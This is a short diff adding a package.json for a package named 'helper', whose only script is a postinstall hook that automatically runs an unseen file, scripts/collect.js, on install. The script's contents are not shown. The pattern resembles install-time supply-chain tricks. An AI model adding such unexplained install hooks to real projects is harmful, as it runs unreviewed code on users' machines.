@@ -1,0 +1,4 @@
+{
+  "name": "helper",
+  "scripts": { "postinstall": "node ./scripts/collect.js" }
+}
